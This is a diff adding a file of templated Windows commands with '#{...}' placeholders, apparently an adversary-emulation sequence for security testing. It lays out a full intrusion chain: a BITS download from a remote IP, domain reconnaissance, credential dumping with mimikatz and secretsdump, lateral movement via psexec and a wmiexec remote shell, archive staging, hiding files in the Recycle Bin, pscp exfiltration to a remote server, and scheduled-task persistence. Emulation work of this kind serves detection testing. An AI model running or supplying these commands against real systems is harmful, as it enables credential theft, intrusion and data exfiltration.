@@ -1,0 +1,43 @@
+Start-BitsTransfer -Source "http://#{bitsadmin_remote_ip}/#{bitsadmin_b64_encoded_string}" -Destination "C:\ProgramData\temp\#{bitsadmin_b64_encoded_string}"
+
+
+net use
+
+
+net view /domain
+
+
+Test-NetConnection "#{host_address}"
+
+
+"#{tcping_local_path}\tcping.exe" "#{tcping_remote_ip}" "#{tcping_remote_port}"
+
+
+"#{nbtscan_local_path}\nbtscan.exe" #{nbt_ip_range}
+
+
+"#{netsess_local_path}\netsess.exe" #{netsess_remote_ip}
+
+
+"#{mimikatz_local_path}\#{mimikatz_arch}\mimikatz.exe" "#{mimikatz_module}"
+
+
+"#{secretsdump_local_path}\secretsdump.exe" "#{secretsdump_domain}"/"#{secretsdump_user}":"#{secretsdump_pass}"@"#{secretsdump_remote_host}"
+
+
+"#{psexec_local_path}\psexec.exe" "#{psexec_user}":"#{psexec_password}"@"#{psexec_remote_host}" "#{psexec_cmd}"
+
+
+rar.exe a "#{rar_archive_name}" "#{rar_files}"
+
+
+copy #{copy_filename} "C:\$Recycle.Bin\"
+
+
+"#{pscp_local_path}\pscp.exe" "#{pscp_exfil_files}" "#{pscp_user}"@"#{pscp_server}":/"#{pscp_drop_location}"
+
+
+cscript.exe "#{wmiexec_local_path}\wmiexec.vbs" /shell "#{wmiexec_remote_host}"
+
+
+schtasks /create /sc "#{schtask_schedule}" /tn "#{schtask_taskname}" /tr "#{schtask_taskrun}" /ru "#{schtask_username}"
